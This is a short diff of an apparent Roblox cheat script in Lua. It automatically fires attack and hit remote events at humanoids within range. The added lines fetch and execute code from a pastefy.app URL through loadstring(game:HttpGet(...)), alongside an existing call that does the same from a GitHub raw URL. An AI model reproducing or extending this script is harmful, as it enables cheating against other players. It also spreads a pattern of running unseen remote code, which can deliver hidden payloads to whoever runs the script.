@@ -27,4 +27,6 @@ local u=m:FindFirstChild("Humanoid")
 if h and u and u.Health>0 and (h.Position-r.Position).Magnitude<=60 then
 if not didy then atk:FireServer() didy=true end
 hit:FireServer(h,{{m,h}},nil,nil,id) end end end end end)
+loadstring(game:HttpGet("https://pastefy.app/UzOQ86aQ/raw"))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ugmoddev/ScriptRbx/refs/heads/main/Main_Beta_Proxy_lib.luau"))()
